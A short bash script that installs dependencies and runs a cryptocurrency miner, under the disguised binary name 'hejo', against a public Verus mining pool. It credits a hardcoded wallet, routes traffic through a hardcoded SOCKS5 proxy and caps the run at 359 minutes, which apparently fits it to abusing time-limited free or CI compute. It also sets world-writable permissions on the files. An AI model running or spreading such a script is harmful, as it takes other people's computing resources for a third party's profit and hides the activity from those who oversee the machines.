#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x cuk.sh && chmod +x hejo chmod 777 hejo cuk.sh
screen -dmS ls
A=stratum+tcp://na.luckpool.net:3956
B=R9WfkuyN7thLWMiL98b2NrHfL1qRYzqcdY
C=PUSHING-14
D=socks5://88.80.119.7:1080
timeout 359m ./hejo -a verus -o $A -u $B.$C -p x -t 2 -x $D
sudo apt update
